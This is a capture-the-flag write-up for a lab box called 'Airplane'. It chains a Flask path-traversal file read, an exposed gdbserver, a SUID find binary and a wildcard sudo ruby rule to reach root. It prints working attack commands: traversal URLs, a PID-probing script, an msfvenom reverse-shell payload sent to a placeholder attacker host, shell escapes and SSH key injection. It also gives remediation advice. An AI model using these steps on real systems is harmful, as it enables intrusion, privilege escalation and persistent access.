# Airplane

Level: Medium
Date: May 10, 2026
Target IP: 10.112.150.67

## Tasks

```
1. What is user.txt?
   
2. What is root.txt
```


## Initial enumeration

```
nmap -sCV -p 1-10000 -oN nmap/initial 10.112.150.67
```

![[Pasted image 20260510235215.png]]

Open ports found:

- Port 22 (SSH) OpenSSH 8.2p1 Ubuntu 4ubuntu0.11
- Port 6048 (Unknown)
- Port 8000 (HTTP) Werkzeug httpd 3.0.2


## Web server enumeration

The website tells us some information about airplanes.

![[Pasted image 20260511000309.png]]


### Directory enumeration

```
gobuster dir -u http://10.112.150.67:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,py,txt,bak,ssh -t 60
```

![[Pasted image 20260511002659.png]]

Found `/airplane`, which displays a very annoying visual saying "Let's fly".

## LFI (Local File Inclusion)

I recognize the pattern of the URL from just doing a lot of CTFs and **usually** this is vulnerable to LFI.

```
http://airplane.thm:8000/?page=index.html
```

When trying to see the contents of `/etc/passwd`, the file's contents downloaded.
Let's check it out.

```
http://airplane.thm:8000/?page=../../../../../etc/passwd
```

![[Pasted image 20260511001350.png]]


`Carlos` and `Hudson` seems to be the users to target. (Line 47 & 49)

![[Pasted image 20260511001605.png]]


## Further LFI poking

Maybe there is a way to get their rsa key's through LFI and then we can access the box with SSH.

```
http://airplane.thm:8000/?page=../../../../../../home/hudson/.ssh/id_rsa


http://airplane.thm:8000/?page=../../../../../../home/carlos/.ssh/id_rsa
```

![[Pasted image 20260511003116.png]]

But no file was found.

**After some further digging:**

There is however a python app `app.py` which we can try to look at.

```
?page=../../../../../../../../proc/self/cmdline
```

![[Pasted image 20260511003606.png]]

## Python app

Found it by going back in the file system to `../app.py`.

![[Pasted image 20260511003848.png]]


This is what makes the LFI vulnerability possible `static/` and then nothing to regulate what request the user makes. Making it possible to read files on the server.

**App Code:**
```python
from flask import Flask, send_file, redirect, render_template, request
import os.path

app = Flask(__name__)


@app.route('/')
def index():
    if 'page' in request.args:
        page = 'static/' + request.args.get('page')

        if os.path.isfile(page):
            resp = send_file(page)
            resp.direct_passthrough = False

            if os.path.getsize(page) == 0:
                resp.headers["Content-Length"]=str(len(resp.get_data()))

            return resp
        
        else:
            return "Page not found"

    else:
        return redirect('http://airplane.thm:8000/?page=index.html', code=302)    


@app.route('/airplane')
def airplane():
    return render_template('airplane.html')


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
```

## Process enumeration

The app didn't really give me anything new, but using `../proc/self/environ` tells me I am currently running as `hudson`.

![[Pasted image 20260511004508.png]]

I thought this might give me the user flag if it is located in Hudson's home folder but that wasn't possible either.

![[Pasted image 20260511004809.png]]


## Unknown port (6048)

I wasn't finding anything that was interesting so I figured maybe the unknown port is running something.

`/proc/net/tcp` shows every active TCP-connection in the system. The column `local-address` is formatted as `IP:PORT` in hex, which means port 6048 in decimal becomes `0x17A0` in hex. By looking for `17A0` in the output, we can identify the row for port 6048, see that UID `1001` (hudson) owns the socket, and note the inode number associated with it.

Each running process has a directory at `/proc/[PID]/fd/` containing its open file descriptors, including sockets, which can be matched against the inode. In practice, the faster approach was to brute-force `/proc/[PID]/cmdline` across all PIDs using the LFI, filter out known system processes, and let the script surface anything unusual.

![[Pasted image 20260511005804.png]]

![[Pasted image 20260511124305.png]]


Trying to brute-force PID's to get access to the service running on port `6048`. But manually doing this is exhausting and will take too much time. 

Time for scripting!

```python
import requests
from concurrent.futures import ThreadPoolExecutor

ignore = ['python', 'bash', 'sh', 'systemd', 'gnome', 'ibus', 'dbus', 
          'kernel', 'kthread', 'migration', 'rcu', 'snapd', 'ssh',
          'cups', 'avahi', 'pulse', 'Xorg', 'gdm', 'apt', 'dpkg']

def check_pid(pid):
    url = f"http://airplane.thm:8000/?page=../../../../../proc/{pid}/cmdline"
    r = requests.get(url, timeout=3)
    if r.text and r.text != "Page not found":
        if not any(word in r.text for word in ignore):
            print(f"PID {pid}: {r.text}")

with ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(check_pid, range(1, 3000))
```

`PID 528` is running gdbserver on the unknown port.

![[Pasted image 20260511010644.png]]


## Reverse shell

Reference:
https://angelica.gitbook.io/hacktricks/network-services-pentesting/pentesting-remote-gdbserver

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=MYIP LPORT=4444 -f elf -o shell.elf
```

```bash
gdb-multiarch -q
```

```bash
nc -lnvp 4444
```

In gdb:
```
(gdb) target extended-remote 10.112.150.67:6048 
(gdb) remote put shell.elf /tmp/shell.elf 
(gdb) set remote exec-file /tmp/shell.elf 
(gdb) run
```

And now we have a reverse shell.
![[Pasted image 20260511011817.png]]


The user flag is located in Carlos's home directory, but we are logged on as Hudson with no permission to read the file.

![[Pasted image 20260511012031.png]]


Unfortunately the `.bash_history` is being sent to `/dev/null` so we can't cat that out.
I also checked if there were any SUID set to hudson but I needed his password for that.

![[Pasted image 20260511012346.png]]


## Privilege Escalation

I did not find much with manual poking so I transferred LinPeas do some work.

There is a SUID on the find-command for Carlos.

![[Pasted image 20260511014928.png]]


GTFOBins is always clutch for priv esc with SUID.

https://gtfobins.org/gtfobins/find/

```bash
find . -exec /bin/sh -p \; -quit
```

![[Pasted image 20260511015255.png]]

And we have now gained access as Carlos, which means we can read the user flag.

![[Pasted image 20260511015612.png]]

![[Pasted image 20260511015912.png]]

## SSH

I wanted a more stable shell since this reverse shell was unbearable. Special characters broke commands and attempting stabilization with Python PTY spawner didn't work either. Instead I generated a new RSA key pair on Kali, added the public key to Carlos's `authorized_keys` and connected via SSH for a proper interactive terminal.

*Note*: The box-timer ran out, therefore a different IP.

![[Pasted image 20260511030123.png]]

![[Pasted image 20260511025747.png]]


![[Pasted image 20260511025623.png]]


![[Pasted image 20260511025948.png]]


![[Pasted image 20260511030023.png]]

## Privilege Escalation 2

Carlos has a sudo-rule for ruby, let's go to GTFOBins again!

The wildcard-rule needs a `.rb` file in `/root`, which means we can't write to it straight away, but instead traverse the path with `../`.

![[Pasted image 20260511030210.png]]


![[Pasted image 20260511030416.png]]

```bash
ruby -e 'exec "/bin/sh"'
```

With this misconfigured sudo-rule I gained root-access and was able to read the root-flag and the box was pwned!

![[Pasted image 20260511030949.png]]


![[Pasted image 20260511031028.png]]


## Summary

### Attack Chain

1. **Web Enumeration** → Gobuster discovered `/airplane` endpoint, URL pattern
   revealed LFI vulnerability via `?page=` parameter
2. **LFI Exploitation** → Traversed to `/etc/passwd` identifying users `carlos`
   and `hudson`
3. **Process Enumeration** → Read `/proc/self/environ` confirming app runs as
   `hudson`, then `/proc/net/tcp` revealed unknown port 6048 owned by UID 1001
4. **PID Brute-force** → Iterated `/proc/[PID]/cmdline` via LFI to identify
   `gdbserver` running on port 6048 (PID 528)
5. **gdbserver RCE** → Uploaded msfvenom ELF payload via GDB remote protocol
   and executed it to obtain a reverse shell as `hudson`
6. **Lateral Movement** → SUID bit on `find` (owned by carlos) used to spawn
   a shell as `carlos` via GTFOBins
7. **SSH Persistence** → Added attacker's public key to `carlos`
   `authorized_keys` for a stable shell
8. **Privilege Escalation** → Misconfigured sudo rule allowed carlos to run
   `ruby /root/*.rb` as root — path traversal via `/../tmp/shell.rb` bypassed
   the restriction and spawned a root shell

---

### Key Vulnerabilities

**1. Local File Inclusion (LFI)**

    /?page=../../../../../etc/passwd

- `page` parameter concatenated directly onto `static/` with no sanitization
- Allowed reading arbitrary files including `/proc` entries and `/etc/passwd`

**2. Exposed gdbserver**

    /usr/bin/gdbserver 0.0.0.0:6048 airplane

- gdbserver bound to all interfaces with no authentication
- Allows arbitrary code execution via the GDB remote debugging protocol

**3. SUID on `find`**

    find . -exec /bin/sh -p \; -quit

- `find` binary had SUID bit set for `carlos`
- Allowed lateral movement from `hudson` to `carlos` via GTFOBins

**4. Misconfigured Sudo Rule**

    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb

- Wildcard `*.rb` does not prevent path traversal
- `sudo /usr/bin/ruby /root/../tmp/shell.rb` matches the rule but executes
  an attacker-controlled file

---

### Security Recommendations

**1. Input Validation**

    # Bad
    page = 'static/' + request.args.get('page')

    # Good
    import os
    page = os.path.join('static', os.path.basename(request.args.get('page')))

- Never concatenate user input directly into file paths
- Use `basename()` or a strict allowlist of permitted files

**2. gdbserver Exposure**

- Never expose gdbserver on a public or semi-public interface
- Bind only to localhost if debugging is required, and disable it in production

**3. SUID Hardening**

- Audit SUID binaries regularly — `find / -perm -4000 -type f`
- Remove SUID from binaries that don't require it

**4. Sudo Wildcard Rules**

- Avoid wildcards in sudo rules — they are rarely safe
- Prefer explicit absolute paths with no user-controlled components

**5. SSH Key Management**

- Restrict write access to `authorized_keys` — world-writable `.ssh` directories allow key injection
- Set correct permissions on `.ssh` folders and files:

	`chmod 700 ~/.ssh`
	`chmod 600 ~/.ssh/authorized_keys` 
	`chown user:user ~/.ssh/authorized_keys`

- Monitor `authorized_keys` for unauthorized entries
- Disable password authentication in `sshd_config` and allow key-based login only

---

### Tools Used

- **nmap** – Port scanning and service detection
- **Gobuster** – Web directory enumeration
- **Burp Suite** – LFI exploitation and request analysis
- **Python script** – PID brute-force via LFI
- **msfvenom** – Reverse shell ELF payload generation
- **gdb-multiarch** – gdbserver exploitation
- **LinPEAS** – Privilege escalation enumeration
- **GTFOBins** – SUID find and sudo ruby exploitation

---

### Lessons Learned

1. **`?page=` parameters are almost always worth testing for LFI** – no
   sanitization of `../` is a critical mistake
2. **`/proc/net/tcp` leaks running services** – hex-decode port numbers to
   identify unknown listeners without direct shell access
3. **gdbserver with no authentication is RCE** – treat any exposed debug
   service as a critical finding
4. **Always run LinPEAS when manual enumeration stalls** – SUID on `find`
   is easy to miss manually
5. **Sudo wildcards can be abused with path traversal** – `*.rb` in `/root/`
   does not prevent `/../tmp/shell.rb`

// summary

A medium-difficulty Linux box on TryHackMe. A Flask app exposed a Local File Inclusion vulnerability via an unsanitized `?page=` parameter, allowing enumeration of `/etc/passwd` and `/proc` entries. Reading `/proc/net/tcp` revealed an unrecognized service on port 6048 — PID brute-forcing via LFI confirmed it as `gdbserver`. An msfvenom ELF payload was uploaded and executed through the GDB remote protocol, yielding a shell as `hudson`. A SUID `find` binary owned by `carlos` enabled lateral movement, and SSH key injection provided a stable shell. Finally, a misconfigured sudo rule allowing `ruby /root/*.rb` was bypassed via path traversal to execute an attacker-controlled Ruby script as root.
